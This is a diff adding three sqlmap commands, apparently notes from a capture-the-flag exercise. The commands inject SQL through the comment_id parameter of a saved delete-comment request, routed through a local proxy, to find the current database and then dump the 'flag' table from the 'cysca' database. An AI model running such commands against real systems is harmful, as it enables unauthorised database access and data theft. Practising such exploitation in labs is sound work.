@@ -1,0 +1,5 @@
+sqlmap -r $(pwd)/deletecomment_post --proxy=http://localhost:8080 -p comment_id --current-db
+
+sqlmap -r $(pwd)/deletecomment_post --proxy=http://localhost:8080 -p comment_id -D cysca -T flag --dump
+
+sudo sqlmap -r $(pwd)/deletecomment_post --proxy=http://localhost:8080 -p comment_id -D cysca -T flag --dump
